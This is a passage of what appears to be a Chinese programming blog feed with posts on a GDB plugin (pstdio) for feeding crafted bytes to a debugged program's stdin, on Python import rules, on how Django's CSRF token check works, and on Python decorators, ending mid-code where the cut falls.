    <title>一个GDB调试技巧：修改程序的标准输入</title>
    <link href="/2017/06/14/gdb-change-program-stdio/"/>
    <url>/2017/06/14/gdb-change-program-stdio/</url>
    
    <content type="html"><![CDATA[<p>想有没有一种方式能一边使用GDB调试程序，一边在需要的时候通过标准输入传递构造好的恶意数据（通常含有各种特殊字符，如<code>\x01\x02\x03</code>等），这样可以实时知道恶意数据输入后，程序的状态、执行过程。而不是执行exp，把程序弄崩溃，利用core file还原崩溃现场。</p><p>想了好几种方式，最后是利用GDB的call命令来调用函数修改被调试程序的标准输入，这样程序可以从我们指定的文件里读取特殊字符。</p><p>写了个GDB Python插件，代码在：<a href="https://github.com/Ovi3/pstdio">https://github.com/Ovi3/pstdio</a></p><h2 id="使用例子"><a href="#使用例子" class="headerlink" title="使用例子"></a>使用例子</h2><p>编译测试用的程序。<code>read.c</code>：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>        <span class="hljs-type">char</span> buf[<span class="hljs-number">32</span>];<br>        <span class="hljs-type">char</span> buf1[<span class="hljs-number">32</span>];<br>        <span class="hljs-type">int</span> len;<br>        len = read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">32</span>);<br>        buf[len] = <span class="hljs-number">0</span>;<br>        write(<span class="hljs-number">1</span>, buf, len);<br><br>        len = read(<span class="hljs-number">0</span>, buf1, <span class="hljs-number">32</span>);<br>        buf1[len] = <span class="hljs-number">0</span>;<br>        write(<span class="hljs-number">1</span>, buf1, len);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>编译：<code>gcc -o read read.c</code><br>安装pstdio：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/Ovi3/pstdio.git ~/pstdio<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;source ~/pstdio/pstdio.py&quot;</span> &gt;&gt; ~/.gdbinit<br></code></pre></div></td></tr></table></figure><p>开始调试<code>gdb -q read</code>。</p><p>先看下帮助文档：<code>pstdio help</code></p><p><img src="gdb_change_program_stdio_1.png" alt="gdb_change_program_stdio_1.png"></p><p>调试执行到<code>call &lt;read@plt&gt;</code>之前，执行（有两个反斜杆）</p><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">pstdio data /x <span class="hljs-symbol">\\</span>x41<span class="hljs-symbol">\\</span>x42<span class="hljs-symbol">\\</span>x43<span class="hljs-symbol">\\</span>x44<span class="hljs-symbol">\\</span>x01<span class="hljs-symbol">\\</span>x02<span class="hljs-symbol">\\</span>x03<span class="hljs-symbol">\\</span>x04<br></code></pre></div></td></tr></table></figure><p>接着执行<code>ni</code>单步执行<code>call &lt;read@plt&gt;</code>后，数据就会被写入。</p><p><img src="gdb_change_program_stdio_2.png" alt="gdb_change_program_stdio_2.png"></p><p><img src="gdb_change_program_stdio_3.png" alt="gdb_change_program_stdio_3.png"></p><p>或者在<code>/path/to/data</code>文件里存数据，接着执行<code>pstdio file /path/to/data</code>，再单步到<code>call &lt;read@plt&gt;</code>，文件里的数据就会被写入。<br><img src="gdb_change_program_stdio_4.png" alt="gdb_change_program_stdio_4.png"></p><p>程序在重新运行后，或者在执行<code>pstdio reset</code>后，程序的标准输入就会恢复，也就是数据从屏幕上输入。<br><img src="gdb_change_program_stdio_5.png" alt="gdb_change_program_stdio_5.png"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-redirect/">https://www.ibm.com/developerworks/cn/linux/l-cn-redirect/</a></li><li><a href="https://stackoverflow.com/questions/9084099/re-opening-stdout-and-stdin-file-descriptors-after-closing-them">https://stackoverflow.com/questions/9084099/re-opening-stdout-and-stdin-file-descriptors-after-closing-them</a></li><li>《Debugging with GDB》 <a href="https://sourceware.org/gdb/onlinedocs/gdb/">https://sourceware.org/gdb/onlinedocs/gdb/</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>二进制</tag>
      
      <tag>GDB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python的模块引入</title>
    <link href="/2017/04/24/python-module-import/"/>
    <url>/2017/04/24/python-module-import/</url>
    
    <content type="html"><![CDATA[<p>环境：</p><blockquote><p>大部分在Python3.7下测试执行</p></blockquote><h2 id="import语句很长时该怎么书写"><a href="#import语句很长时该怎么书写" class="headerlink" title="import语句很长时该怎么书写"></a>import语句很长时该怎么书写</h2><p>可以：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">from</span> Tkinter import Tk, Frame, <span class="hljs-selector-tag">Button</span>, Entry, <span class="hljs-selector-tag">Canvas</span>, Text, \<br>    <span class="hljs-attribute">LEFT</span>, DISABLED, <span class="hljs-attribute">NORMAL</span>, RIDGE, END<br></code></pre></div></td></tr></table></figure><p>也可以：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">from</span> Tkinter import Tk, Frame, <span class="hljs-selector-tag">Button</span>, Entry, <span class="hljs-selector-tag">Canvas</span>, Text<br><span class="hljs-selector-tag">from</span> Tkinter import <span class="hljs-attribute">LEFT</span>, DISABLED, <span class="hljs-attribute">NORMAL</span>, RIDGE, END<br></code></pre></div></td></tr></table></figure><p>但官方建议使用括号：</p><figure class="highlight elm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elm"><span class="hljs-title">from</span> <span class="hljs-type">Tkinter</span> <span class="hljs-keyword">import</span> (<span class="hljs-type">Tk</span>, <span class="hljs-type">Frame</span>, <span class="hljs-type">Button</span>, <span class="hljs-type">Entry</span>, <span class="hljs-type">Canvas</span>, <span class="hljs-type">Text</span>,<br>    <span class="hljs-type">LEFT</span>, <span class="hljs-type">DISABLED</span>, <span class="hljs-type">NORMAL</span>, <span class="hljs-type">RIDGE</span>, <span class="hljs-type">END</span>)<br></code></pre></div></td></tr></table></figure><h2 id="模块查找顺序"><a href="#模块查找顺序" class="headerlink" title="模块查找顺序"></a>模块查找顺序</h2><ol><li>先搜索内置模块(<code>built-in module</code>，内置在python编译器)，如<code>winreg</code>模块(或叫<code>_winreg</code>模块，只在Windows下存在)</li><li>从<code>sys.path</code>（list类型）指定的一个个目录里搜索。</li></ol><h4 id="关于sys-path"><a href="#关于sys-path" class="headerlink" title="关于sys.path"></a>关于<code>sys.path</code></h4><p>执行<code>python script.py</code>时，<code>sys.path</code>的第一个元素是<code>script.py</code>文件所在的目录；如果不指定脚本文件，如；直接执行<code>python</code>进入交互模式，或执行<code>python -m expectd.package.module</code>等，<code>sys.path</code>的第一个元素就是空字符串，代表执行<code>python</code>命令时所在的目录。</p><p><code>sys.path</code>还包括<code>PYTHONPATH</code>环境变量指定的目录，和安装时指定的默认值(<code>The installation-dependent default</code>)</p><h2 id="绝对引入"><a href="#绝对引入" class="headerlink" title="绝对引入"></a>绝对引入</h2><p>一个目录结构为：</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">package/<br>__init__.<span class="hljs-keyword">py</span><br><span class="hljs-built_in">string</span>.<span class="hljs-keyword">py</span><br>test.<span class="hljs-keyword">py</span><br></code></pre></div></td></tr></table></figure><p>在<code>test.py</code>里写<code>import string</code>，然后在<code>package/</code>目录的上一层目录（以让python找到我们自己写的<code>package</code>的位置）执行<code>python -m package.test</code>，那<code>import</code>的是同目录下的<code>string</code>模块，还是python自带的<code>string</code>模块呢？</p><p>在Python2.7下测试，是引入同目录下的<code>string</code>模块，因为<code>import string</code>语句会先查找同目录下的模块。这样的引入方式，无法在不重命名<code>package/string.py</code>文件的情况下导入python自带的<code>string</code>模块。所以Python加了一个绝对引入（<code>absolute import</code>），且在python3中默认使用，而在Python 2中使用绝对引入，需要在文件头写：<code>from __future__ import absolute_import</code>。</p><p>绝对引入是指<code>import</code>时，都是从<code>sys.path</code>指定的目录下查找包或模块。如：<code>import foo</code>，<code>from foo import bar</code>。有了绝对引入，那要引入同目录下的模块，需要加上<code>.</code>符号，这叫相对引入(<code>relative import</code>， 相对于当前模块来引入)。如：<code>from .foo import bar</code>。而要引入上一层的模块，就用两个点，要引入上上一层就用三个点，如：<code>from ..foo import bar</code>引入上一层的模块。另外，要引入上一层的模块时，不可以写成<code>import ..foo</code>，而是写成<code>from .. import foo</code>。</p><p>所以上面在python3测试，是引入python自带的<code>string</code>模块，若要引入同目录下的string模块，就写成<code>from . import string</code></p><h2 id="init-py文件"><a href="#init-py文件" class="headerlink" title="__init__.py文件"></a><code>__init__.py</code>文件</h2><p>在目录下有<code>__init__.py</code>文件，Python才会把该目录看作包（<code>package</code>），在该文件中可以写初始化代码（引入包或包里模块等时会执行<code>__init__.py</code>），也可以设置<code>__all__</code>变量。</p><p>一个包的目录结构为：</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">package/<br>__init__.<span class="hljs-keyword">py</span><br>moduleX.<span class="hljs-keyword">py</span><br>moduleY.<span class="hljs-keyword">py</span><br></code></pre></div></td></tr></table></figure><p>如果<code>__init__.py</code>文件的<code>__all__</code>变量没设置，执行<code>from package import *</code>或<code>import package</code>并不会引入<code>package</code>下的子模块或子包，而仅仅是引入该包（一般会执行<code>__init__.py</code>的代码）。需要这样写<code>from package import moduleX, moduleY</code>，就可以引入模块。</p><p>如果<code>__init__.py</code>文件里写<code>__all__ = [&#39;moduleX&#39;, &#39;moduleY&#39;]</code>，执行<code>from package import *</code>就会引入<code>__all__</code>里的模块或子包，也就是会在当前域中存在<code>moduleX</code>和<code>moduleY</code>变量。</p><h2 id="python-script"><a href="#python-script" class="headerlink" title="python script"></a>python script</h2><p>有些时候并不是要写一个模块供调用，而是写几个脚本来执行。</p><p>目录结构为：</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">my_scripts/<br>sub/<br>__init__.<span class="hljs-keyword">py</span><br>fibo.<span class="hljs-keyword">py</span><br>helper.<span class="hljs-keyword">py</span><br>test.<span class="hljs-keyword">py</span><br></code></pre></div></td></tr></table></figure><p>（因为要在<code>test.py</code>文件中引入<code>sub/fibo.py</code>，需要告诉Python <code>sub</code>目录是个包，所以要放置<code>__init__.py</code>文件）</p><p>在<code>test.py</code>里引入</p><figure class="highlight elm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elm"><span class="hljs-keyword">import</span> helper<br><span class="hljs-title">from</span> sub <span class="hljs-keyword">import</span> fibo<br></code></pre></div></td></tr></table></figure><p>然后在<code>my_scripts/</code>目录下执行<code>python test.py</code>。可以引入，没有报错。这是为什么？</p><p>像上面说的，<code>sys.path</code>的第一个元素是<code>test.py</code>所在的目录，所以上面两个绝对引入是可以找得到<code>helper</code>跟<code>fibo</code>的。</p><h2 id="python-m命令"><a href="#python-m命令" class="headerlink" title="python -m命令"></a>python -m命令</h2><p>模块除了被<code>import</code>，也可以直接用<code>python -m</code>命令把模块当脚本来执行。如：<code>python -m json.tool</code>执行json包里的tool模块，用来格式化JSON数据。还有<code>python -m pdb script.py</code>、<code>python -m profile script.py</code>等。</p><p><code>python -m</code>命令，实际上是调用<code>runpy</code>模块的<code>runpy.run_module(mod_name, init_globals=None, run_name=None, alter_sys=False)</code>方法，其会搜索模块，依据加载的包、模块名来设置<code>__package__</code>属性等，以便让相对引入正确执行。例如执行<code>python -m json.tool</code>时，<code>__name__</code>设置成<code>json.tool</code>，<code>__package__</code>设置成<code>&quot;json.tool&quot;.rpartition(&#39;.&#39;)[0]</code>，即<code>json</code>。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li>Python Modules:  <a href="https://docs.python.org/2.7/tutorial/modules.html">https://docs.python.org/2.7/tutorial/modules.html</a></li><li>PEP 328 – Imports: Multi-Line and Absolute/Relative：<a href="https://www.python.org/dev/peps/pep-0328/">https://www.python.org/dev/peps/pep-0328/</a></li><li>PEP 366 – Main module explicit relative imports:  <a href="https://www.python.org/dev/peps/pep-0366/">https://www.python.org/dev/peps/pep-0366/</a></li><li>PEP 338 – Executing modules as scripts:  <a href="https://www.python.org/dev/peps/pep-0338/">https://www.python.org/dev/peps/pep-0338/</a></li></ul><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript"><span class="hljs-keyword">from</span> fibo <span class="hljs-keyword">import</span> *<br></code></pre></div></td></tr></table></figure><p><code>fibo</code>是个模块，该<code>import</code>会导入<code>fibo</code>模块下所有变量，除了以<code>_</code>开头的变量。</p><p><code>dir()</code>不会列出内置函数和内置变量，如果想要获取内置函数和内置变量，使用<code>import builtins; dir(builtins)</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Django CSRF防御具体流程</title>
    <link href="/2017/01/20/django-csrf-protect-principle/"/>
    <url>/2017/01/20/django-csrf-protect-principle/</url>
    
    <content type="html"><![CDATA[<p>Django对CSRF的防御<strong>主要</strong>由<code>django.middleware.csrf.CsrfViewMiddleware</code>中间件来实现。通过在<code>settings.py</code>的<code>MIDDLEWARE_CLASSES</code>（新版的Django该项改为<code>MIDDLEWARE</code>）加上<code>django.middleware.csrf.CsrfViewMiddleware</code>来启用这个中间件。通过Django源码的<code>django/middleware/csrf.py</code>文件，调试程序来分析了Django CSRF防御流程。这篇文章记下我的理解。</p><p>版本说明：</p><blockquote><p>Django Version：1.9.5<br>Python Version：2.7</p></blockquote><h2 id="Django-CSRF防御具体流程"><a href="#Django-CSRF防御具体流程" class="headerlink" title="Django CSRF防御具体流程"></a>Django CSRF防御具体流程</h2><p>首先要清楚Django是怎么验证一个请求不是CSRF：Django会从请求头cookie取<code>csrftoken</code>这一项的值，再从POST表单里取<code>csrfmiddlewaretoken</code>这一项（或从请求头<code>X-CSRFToken</code>取）的值，通过比对两者是否一致来判断这个请求是不是非法，非法就返回403状态码。这里的“是否一致”，并不是判断两者的值是否相等，而是判断<code>_unsalt_cipher_token(csrfmiddlewaretoken)</code>和<code>_unsalt_cipher_token(csrftoken)</code>是否相等，具体留在后面说。</p><p>而生成<code>csrftoken</code>和<code>csrfmiddlewaretoken</code>的代码在<code>get_token(request)</code>函数</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_token</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;CSRF_COOKIE&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.META:<br>        csrf_secret = _get_new_csrf_string()<br>        request.META[<span class="hljs-string">&quot;CSRF_COOKIE&quot;</span>] = _salt_cipher_secret(csrf_secret)<br>    <span class="hljs-keyword">else</span>:<br>        csrf_secret = _unsalt_cipher_token(request.META[<span class="hljs-string">&quot;CSRF_COOKIE&quot;</span>])<br>    request.META[<span class="hljs-string">&quot;CSRF_COOKIE_USED&quot;</span>] = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> _salt_cipher_secret(csrf_secret)<br></code></pre></div></td></tr></table></figure><p>这个函数会在渲染模板的时候调用，具体来说是由<code>csrf context processor</code>调用。<br>如果<code>request.META[&quot;CRSF_COOKIE&quot;]</code>不存在，就调用<code>_get_new_csrf_string()</code>函数来生成一串随机字符（32个字符，大小写字母和数字），赋给<code>csrf_secret</code>，再调用<code>_salt_cipher_secret(scrf_secret)</code>生成64个字符的字符串赋给<code>request.META[&quot;CSRF_COOKIE&quot;]</code>，而这个<code>request.META[&quot;CSRF_COOKIE&quot;]</code>之后用来设置COOKIE 的<code>csrftoken</code>。<br>最后的返回值<code>_salt_cipher_secret(csrf_secret)</code>就渲染到POST表单的<code>csrfmiddlewaretoken</code>。值得一提的是<code>_salt_cipher_secret(csrf_secret)</code>每次的返回值都不一样，而<code>csrf_secret == _unsalt_cipher_token(_salt_cipher_secret(csrf_secret))</code>。</p><p>总的来说，涉及到三个值，<code>csrftoken</code>、<code>csrfmiddlewaretoken</code>和<code>csrf_secret</code>，还有两个函数，<code>_unsalt_cipher_token(token)</code>和<code>_salt_cipher_secret(token)</code>。用图来说明下这两个过程：</p><ol><li>生成<code>csrftoken</code>和<code>csrfmiddlewaretoken</code>。</li><li>验证<code>csrftoken</code>和<code>csrfmiddlewaretoken</code>是否一致。</li></ol><p><img src="django_csrf_protect_principle_1.png" alt="生成csrftoken和csrfmiddlewaretoken.png"></p><p>那<code>_unsalt_cipher_token</code>和<code>_salt_cipher_secret</code>这两个函数具体怎么实现呢？怎么做到<code>_salt_cipher_secret(csrf_secret)</code>每次返回的token值不同，调用<code>_unsalt_cipher_token(token)</code>就返回原来的<code>csrf_secret</code>？</p><p>用图来表示（简化下，把<code>csrf_secret</code>长度改为3）</p><p><img src="django_csrf_protect_principle_2.png" alt="Django CSRF TOKEN具体生成和验证算法.png"></p><p>上面的过程主要涉及到的数值运算就这两条式子（下面的符号都表示一个整数）:</p><figure class="highlight excel"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs excel"><span class="hljs-number">1</span>. Cipher = (Secret + Salt) <span class="hljs-built_in">mod</span> <span class="hljs-built_in">N</span><br><span class="hljs-number">2</span>. (Cipher - Salt) <span class="hljs-built_in">mod</span> <span class="hljs-built_in">N</span> 会等于 Secret<br></code></pre></div></td></tr></table></figure><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ol><li><code>django/middleware/csrf.py</code>文件里有个函数：<code>rotate_token(request)</code>，这个函数用来改变<code>csrftoken</code>这个COOKIE。  在用户登录后（是指 <code>django.contrib.auth</code>这个组件的登录）调用，主要从安全考虑，避免这个COOKIE跟登录前的一样。  如果自己实现的登录逻辑，可以调用这个函数提高点安全性。</li><li>一般<code>csrftoken</code>这个COOKIE是不会变的，除了第一点说的登录，和不存在时重新生成一个。有时候会出现登录后<code>csrftoken</code>失效的情况。官网一个<a href="https://docs.djangoproject.com/en/1.10/ref/csrf/#why-might-a-user-encounter-a-csrf-validation-failure-after-logging-in">FAQ</a></li><li>为什么Django要把<code>csrftoken</code>和<code>csrfmiddlewaretoken</code>设置成不相等，直接生成的时候让它们相等，验证的时候判断是否相等不就好了？个人觉得这样做有个好处，有时候<code>csrftoken</code>这个COOKIE前端不需要获取，可以设置成HTTP ONLY，提高点安全性。 大家怎么看？</li><li>从上面分析的算法来看，<code>csrftoken</code>跟<code>csrfmiddlewaretoken</code>相同也可以通过CSRF验证。所以在AJAX请求中，直接取<code>csrftoken</code>值加到请求中就好了。</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Web安全</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python装饰器</title>
    <link href="/2017/01/16/python-decorator/"/>
    <url>/2017/01/16/python-decorator/</url>
    
    <content type="html"><![CDATA[<p>以前在<a href="http://www.imooc.com/learn/581">IMOOC</a>上学习的笔记。今晚整理下发出来。</p><p>要理解装饰器，先了解函数作用域和闭包。</p><ol><li><p>函数作用域的查找顺序概括为：L -&gt; E -&gt; G -&gt; B</p><blockquote><p>local 函数内部作用域</p><p>enclosing 函数内部与内嵌函数之间</p><p>global 全局作用域</p><p>build-in 内置作用域</p></blockquote></li><li><p>闭包（Closure）就是内部函数中对enclosing作用域的变量进行引用。举例：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># -*-coding:utf-8 -*-</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params">func</span>):<br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">x, y</span>):<br>       <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(x, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(y, <span class="hljs-built_in">int</span>):<br>           <span class="hljs-keyword">return</span> func(x, y)<br>       <span class="hljs-keyword">else</span>:<br>           <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Error&#x27;</span><br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>   <span class="hljs-keyword">return</span> wrapper<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mysum</span>(<span class="hljs-params">x, y</span>):<br>    <span class="hljs-keyword">return</span> x + y<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mymul</span>(<span class="hljs-params">x, y</span>):<br>    <span class="hljs-keyword">return</span> x * y<br><br>mysum_ex = foo(mysum)<br><span class="hljs-built_in">print</span> mysum_ex(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span> mysum_ex.__closure__<br><br>mymul_ex = foo(mymul)<br><span class="hljs-built_in">print</span> mymul_ex(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span> mymul_ex.__closure__<br></code></pre></div></td></tr></table></figure><p>执行完<code>foo</code>函数，内部变量被回收，这里是<code>func</code>变量。但是在执行<code>mysum_ex</code>函数时，为什么访问得到<code>func</code>变量呢？因为闭包函数<code>mysum_ex</code>（实际上就是<code>wrapper</code>函数）有一个属性<code>__closure__</code>，存储着需要用到的enclosing 变量，即<code>func</code>变量。</p><p>闭包作用：封装和代码复用。怎么体现？</p><p>上面的<code>mysum</code>用来执行两个整数的加法，<code>mymul</code>用来执行两个整数的乘法。如果直接执行<code>mysum(&#39;1&#39;, 2)</code>或<code>mymul(&#39;1&#39;, 2)</code>是会报错：<code>TypeError: cannot concatenate &#39;str&#39; and &#39;int&#39; objects</code>。所以需要添加判断参数是否是int类型的逻辑代码，如<code>mysum</code>函数</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">mysum</span>(<span class="hljs-params">x, y</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(x, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(y, <span class="hljs-built_in">int</span>):<br>        <span class="hljs-keyword">return</span> x + y<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Error&#x27;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br></code></pre></div></td></tr></table></figure><p><code>mymul</code>函数也需要相同的判断逻辑，所以利用闭包把这部分判断逻辑代码封装到<code>wrapper()</code>中，通过传递函数对象<code>func</code>给<code>wrapper()</code>函数内部使用，来决定到底使用加法操作还是乘法操作。这部分判断参数是否是int类型的逻辑代码达到了代码复用。</p></li></ol><p>最后说装饰器。上面的闭包例子用装饰器来写：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># -*-coding:utf-8 -*-</span><br><span class="hljs-keyword">import</span> functools<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params">func</span>):<br><span class="hljs-meta">    @functools.wraps(<span class="hljs-params">func</span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">x, y</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(x, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(y, <span class="hljs-built_in">int</span>):<br>            <span class="hljs-keyword">return</span> func(x, y)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Error&#x27;</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">return</span> wrapper<br><br><br><span class="hljs-meta">@foo</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mysum</span>(<span class="hljs-params">x, y</span>):<br>    <span class="hljs-keyword">return</span> x + y<br><br><span class="hljs-built_in">print</span> mysum(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span> mysum(<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-number">2</span>)<br></code></pre></div></td></tr></table></figure><p>执行结果：</p><figure class="highlight subunit"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs subunit">3<br><span class="hljs-keyword">Error</span><br><span class="hljs-keyword"></span>None<br></code></pre></div></td></tr></table></figure><p>对于装饰器的几点说明：</p><ol><li><p>装饰器是对闭包的使用。</p></li><li><p>传递一个函数对象<code>func</code>给装饰器<code>foo</code>，<code>foo</code>返回一个新的函数对象。对于闭包，就不一定要传递函数对象，可以传递其它类型的对象。如：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># -*-coding:utf-8 -*-</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_passline</span>(<span class="hljs-params">passline</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cmp</span>(<span class="hljs-params">val</span>):<br>        <span class="hljs-keyword">if</span> val &gt;= passline:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;pass&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span 